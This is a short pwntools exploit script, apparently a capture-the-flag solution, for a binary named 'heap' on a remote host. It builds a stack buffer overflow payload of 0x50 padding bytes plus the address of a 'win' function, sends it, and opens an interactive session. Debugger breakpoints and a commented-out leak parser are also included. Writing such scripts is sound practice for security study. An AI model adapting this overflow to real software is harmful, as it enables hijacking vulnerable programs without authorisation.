#!/usr/bin/env python3
from pwn import *
import time
import ctypes
from ctypes import CDLL

exe_path = 'heap'
HOST = '103.77.175.40'
PORT = 6091

exe = ELF(exe_path, checksec=False)

context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *0x00000000004018ad
break *0x0000000000401941
break *0x0000000000401970
break *0x0000000000401983
b*0x401994
c
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
'''
p.recvuntil(b'data is at ')
leak = int(p.recvuntil(b',')[:-1], 16)
log.info(f'leak: {hex(leak)}')
'''

win = 0x0000000000401813
system = 0x40c040
payload = flat(
    b'A' * 0x50,
    win
)
# BRUTE FORCE!!!!!!!!
p.sendlineafter(b'Enter a string: \n',payload)

p.interactive()
